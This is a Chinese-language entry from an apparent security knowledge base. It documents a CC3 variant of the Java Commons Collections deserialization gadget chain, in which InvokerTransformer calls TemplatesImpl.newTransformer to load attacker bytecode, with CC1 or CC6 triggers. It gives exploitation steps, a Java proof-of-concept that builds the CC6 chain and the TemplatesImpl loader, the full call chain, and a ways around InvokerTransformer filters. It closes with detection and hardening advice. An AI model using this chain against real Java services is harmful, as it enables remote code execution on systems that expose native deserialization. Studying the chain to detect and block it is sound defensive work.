---
id: web-java-deser-commonscollections-cc3-invokertransformer-newtransformer-variant
title: CC3 变体：InvokerTransformer 直调 TemplatesImpl.newTransformer 的 CC1/CC6 触发器与字节码加载条件
type: scenario
domain: web
path: web/java/deserialization
technique: cc3-invokertransformer-direct-newtransformer-templatesimpl
tags:
- java
- deserialization
- gadget
- commons-collections
- cc3
- cc1
- cc6
- templatesimpl
- invokertransformer
- abstracttranslet
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V265
  verified_at: '2026-11-07T18:27:50+08:00'
  notes: 重试核验：已对照 content.md 与 25 张图；TemplatesImpl.newTransformer→getTransletInstance→defineTransletClasses→TransletClassLoader.defineClass 调用链与图05/06/07/08一致；_name非空/_class=null/_tfactory=TransformerFactoryImpl/字节码须继承 AbstractTranslet（图11首版失败、图12改 AbstractTranslet、图13弹计算器）与原文一致；ConstantTransformer+InvokerTransformer(newTransformer) 直桥接 PoC（图14/15/16/17）与 TrAXFilter+InstantiateTransformer 路径（图18-25）均覆盖；与既有 cc6-cc3-templatesimpl 卡桥接不同，dedup verdict=related 非同链；未复跑 PoC
url: /docs/web/java/deserialization/web-java-deser-commonscollections-cc3-invokertransformer-newtransformer-variant/
draft: false
kb_aliases:
- CC3 变体
- InvokerTransformer newTransformer
- TemplatesImpl 动态加载字节码
- CC1 接 TemplatesImpl
- CC6 接 TemplatesImpl
- TransletClassLoader defineClass
- defineTransletClasses
---

## 一句话结论

CC3 的攻击段不一定非要 `TrAXFilter`：用 `ChainedTransformer` 把 `ConstantTransformer(templates)` 与 `InvokerTransformer("newTransformer", null, null)` 串起来，就能直接反射调用 `TemplatesImpl.newTransformer()` 加载恶意字节码；前半段可接 CC1 的 `TransformedMap`/`LazyMap`+`AnnotationInvocationHandler`（JDK≤8u65），或 CC6 的 `TiedMapEntry`+`LazyMap`+`HashMap/HashSet`（JDK 8u71+），形成多条等价 CC3 变体。

## 原理

- `TemplatesImpl.newTransformer()` → `getTransletInstance()` → 若 `_class == null` 则 `defineTransletClasses()`；后者用内部类 `TransletClassLoader`（继承 `ClassLoader`）的 `defineClass(byte[])` 逐个加载 `_bytecodes` 数组中的字节码，并把加载出的类存入 `_class[]`。
- 触发加载的前置条件：`_name != null`（否则 `getTransletInstance` 直接返回 null）、`_class == null`（否则跳过 `defineTransletClasses`）、`_tfactory != null` 且为 `TransformerFactoryImpl`（`defineTransletClasses` 里调用 `_tfactory.getExternalExtensionsMap()`，null 会 NPE）、`_bytecodes` 为二维字节数组。
- 字节码对应的类必须继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`：`defineTransletClasses` 会检查父类，否则抛 `ClassCastException`/不满足 translet 约束；命令放在构造器或静态初始化块中，在类加载/实例化时执行。原文第一次用普通类（只继承 Object）失败，改为继承 `AbstractTranslet` 后成功弹计算器。
- 直接桥接：`ConstantTransformer(templates)` 丢弃 `transform` 的入参并返回 `TemplatesImpl` 实例；`InvokerTransformer("newTransformer", null, null)` 对入参执行 `input.getClass().getMethod("newTransformer").invoke(input)`，即调用 `templates.newTransformer()`。`ChainedTransformer` 顺序执行两者，第二个 Transformer 的入参就是第一个的返回值。
- 与 `TrAXFilter` 路径的区别：`TrAXFilter(Templates)` 的公有构造器内部调用 `templates.newTransformer()`，配合 `InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})` 可避免显式使用 `InvokerTransformer("newTransformer")`，在只封禁 InvokerTransformer 方法名/类的过滤规则下更稳；直接桥接则少依赖 `TrAXFilter`，链更短。
- 前半段复用既有 CC1/CC6 触发器：CC1 `TransformedMap`+`AnnotationInvocationHandler` 或 `LazyMap`+动态代理；CC6 `TiedMapEntry.hashCode`→`LazyMap.get`→`ChainedTransformer`。CC6 不依赖 `AnnotationInvocationHandler`，JDK 8u71+ 仍可用。
- 构造期陷阱：`hashMap.put(tiedMapEntry, ...)` 会提前触发一次 `TiedMapEntry.hashCode`→`LazyMap.get`→`transform`，若真实链已就位会本地先执行命令；应先放无害的 `ConstantTransformer`，put 后再反射替换 `ChainedTransformer.iTransformers`，并 `innermap.remove(key)` 清掉 LazyMap 缓存，保证反序列化时再次触发。

## 触发条件

- 目标使用 Java 原生反序列化（`ObjectInputStream.readObject`）且输入可控。
- classpath 存在 Commons Collections 3.2.1 及以下（`InvokerTransformer`/`ChainedTransformer`/`LazyMap` 可序列化且未被 `checkUnsafeSerialization` 拦截；3.2.2+ 会失效）。
- 目标 JDK 可访问内部 Xalan `TemplatesImpl`（JDK 8 默认可用；高版本模块封装需换外部 Xalan 或其它 sink）。
- CC1 触发器需 JDK≤8u65；CC6 触发器可在 JDK 8u71+ 使用。
- 攻击者能反射设置 `TemplatesImpl` 私有字段，并能提供继承 `AbstractTranslet` 的恶意字节码。

## 利用步骤

1. 编写恶意类继承 `AbstractTranslet`，实现两个 `transform` 方法，在构造器/静态块写入命令，编译后取 `.class` 字节码（可 Base64 内嵌）。
2. 反射构造 `TemplatesImpl`：`_name` 非空字符串、`_class=null`、`_bytecodes=new byte[][]{bytes}`、`_tfactory=new TransformerFactoryImpl()`。
3. 构造直接桥接的 `ChainedTransformer`：
   `new ConstantTransformer(templates)` + `new InvokerTransformer("newTransformer", null, null)`。
4. 选择前半段：
   - CC1 TransformedMap：`TransformedMap.decorate(hashMap,null,chain)`，`hashMap.put("value",...)`，用 `AnnotationInvocationHandler(Retention.class, map)` 构造入口；
   - CC1 LazyMap：`LazyMap.decorate(hashMap,chain)` + 内层 `AnnotationInvocationHandler` + `Map` 动态代理 + 外层 `AnnotationInvocationHandler`；
   - CC6：`LazyMap` + `TiedMapEntry(lazyMap,key)` 放入 `HashMap`/`HashSet`，put 后反射替换 `iTransformers` 并 `innermap.remove(key)`。
5. 序列化入口对象，发送到目标反序列化点；观察命令执行。
6. 若 InvokerTransformer 被过滤，改用 `ConstantTransformer(TrAXFilter.class)` + `InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})` 的 TrAXFilter 路径。

## PoC

```java
// TemplatesImpl 构造（字节码需继承 AbstractTranslet）
TemplatesImpl impl = new TemplatesImpl();
setValue(impl, "_name", "b1uel0n3");
setValue(impl, "_class", null);
setValue(impl, "_bytecodes", new byte[][]{evilBytes});
setValue(impl, "_tfactory", new TransformerFactoryImpl());

// 直接桥接：ConstantTransformer(templates) -> InvokerTransformer("newTransformer")
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(impl),
    new InvokerTransformer("newTransformer", null, null)
};
ChainedTransformer chain = new ChainedTransformer(transformers);

// CC6 前半段（JDK 8u71+）
Transformer[] fake = new Transformer[]{new ConstantTransformer(1)};
ChainedTransformer lazyChain = new ChainedTransformer(fake);
Map inner = new HashMap();
Map lazyMap = LazyMap.decorate(inner, lazyChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "b1uel0n3");
HashSet set = new HashSet();
set.add(entry);
inner.remove("b1uel0n3");
Field f = lazyChain.getClass().getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(lazyChain, transformers);   // 换成真实链后再反序列化

// 序列化 set 并 readObject 触发
```

```text
关键调用链：
HashMap/HashSet.readObject -> TiedMapEntry.hashCode -> LazyMap.get ->
ChainedTransformer.transform -> ConstantTransformer(templates) ->
InvokerTransformer("newTransformer") -> TemplatesImpl.newTransformer ->
getTransletInstance -> defineTransletClasses -> TransletClassLoader.defineClass
-> 恶意类 <clinit>/构造器执行
```

## 变体与关联

- 变体：前半段可换 CC1 `TransformedMap`/`LazyMap`（JDK≤8u65）或 CC6 `HashMap`/`HashSet`（JDK 8u71+）；攻击段不变。
- 变体：桥接可换 `TrAXFilter`+`InstantiateTransformer`，在只封 InvokerTransformer 的规则下更稳；也可用 `TrAXFilter` 构造器直接 new 出来做本地验证。
- 变体：字节码类可用 Javassist/ASM 生成，或使用两段字节码 + `_transletIndex=0` 的免 AbstractTranslet 变体（见关联卡）。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC6 触发 + TrAXFilter/InstantiateTransformer 的已覆盖路径）、[[web-java-deser-commonscollections-cc1-transformedmap]]、[[web-java-deser-commonscollections-cc1-lazymap-proxy]]（CC1 前半段）、[[web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect]]（非 AbstractTranslet 载荷的构造期副作用）、[[web-java-classloader-deserialization-memshell-loader-selection]]（TemplatesImpl 作为类加载原语）。
- 边界：Commons Collections 3.2.2+、JDK 模块封装导致内部 Xalan 不可用、或 `ObjectInputFilter` 类白名单会阻断；`InvokerTransformer` 被按类名/方法名过滤时改用 TrAXFilter 路径。

## 检测与防御

- 检测：反序列化流中出现 `TemplatesImpl`、`TrAXFilter`、`InstantiateTransformer`、`InvokerTransformer`、`ChainedTransformer`、`LazyMap`、`TiedMapEntry` 组合；运行时监控 `TransletClassLoader.defineClass`/新类加载与 `Runtime.exec`。
- 修复：升级 Commons Collections 到 3.2.2+（保持 unsafe serialization 关闭）；避免对外暴露原生反序列化入口。
- 加固：JEP 290 `ObjectInputFilter` 白名单禁用上述类；升级 JDK 并限制内部 Xalan 访问；对必须反序列化的入口做签名与来源校验。
